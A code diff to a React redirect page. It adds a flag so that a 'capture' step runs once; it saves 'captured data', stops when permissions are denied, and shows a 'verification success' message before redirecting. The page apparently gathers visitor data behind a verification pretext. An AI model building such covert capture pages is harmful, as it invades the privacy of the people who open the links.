@@ -289,6 +289,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   const [isPaused, setIsPaused] = React.useState(true);
   const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
   const [t, setT] = React.useState(() => getTranslator('en'));
+  const [captureInitiated, setCaptureInitiated] = React.useState(false);
   
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
@@ -340,7 +341,11 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
 
 
   React.useEffect(() => {
-    if (!settings || isPreview || !isPaused) return;
+    // Guard against re-running the logic, or running without settings.
+    if (!settings || isPreview || captureInitiated) return;
+    
+    // Immediately set the flag to prevent re-entry from re-renders.
+    setCaptureInitiated(true);
 
     const performRedirect = () => {
         if (!isMounted.current) return;
@@ -463,7 +468,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         } catch(e) { console.error("Failed to save captured data:", e); }
         
         if (anyPermissionDenied) {
-            setIsPaused(true); // Pause the redirect indefinitely
+            // Do nothing; the capture is complete, and the redirect is paused.
+            // The `captureInitiated` flag prevents this whole effect from re-running.
         } else {
             addNotification({ type: 'success', message: 'notification_verification_success' });
             startRedirectSequence();
@@ -476,7 +482,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
       startRedirectSequence();
     }
 
-  }, [settings, isPreview, isPaused, addNotification]);
+  }, [settings, isPreview, captureInitiated, addNotification]);
   
   const handleClosePreview = () => onClosePreview?.();
 
